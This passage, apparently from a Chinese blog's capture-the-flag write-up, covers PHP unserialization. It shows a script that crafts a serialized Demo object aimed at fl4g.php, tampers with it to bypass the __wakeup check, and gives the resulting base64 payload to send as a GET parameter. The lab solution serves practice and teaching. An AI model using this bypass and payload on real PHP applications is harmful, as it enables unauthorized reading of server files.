+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Demo</span>(<span class="string">&#x27;fl4g.php&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:1:&#x27;</span>,<span class="string">&#x27;:2:&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2023/08/02/web-unserialize/image-20230802231804349.png" alt="image-20230802231804349"></p>
+<p>以get方法传入<code>var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></p>
+<p><img src="/2023/08/02/web-unserialize/image-20230802231842664.png" alt="image-20230802231842664"></p>
 ]]></content>
   </entry>
 </search>
